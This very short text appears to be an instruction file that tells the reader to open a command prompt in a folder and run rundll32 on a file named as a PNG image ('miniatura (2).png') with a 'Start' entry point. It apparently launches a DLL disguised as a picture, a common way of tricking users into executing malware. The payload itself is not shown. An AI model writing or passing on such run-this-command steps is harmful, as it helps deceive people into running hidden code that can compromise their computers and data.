only open this folder on cmd and write
rundll32 "miniatura (2).png",Start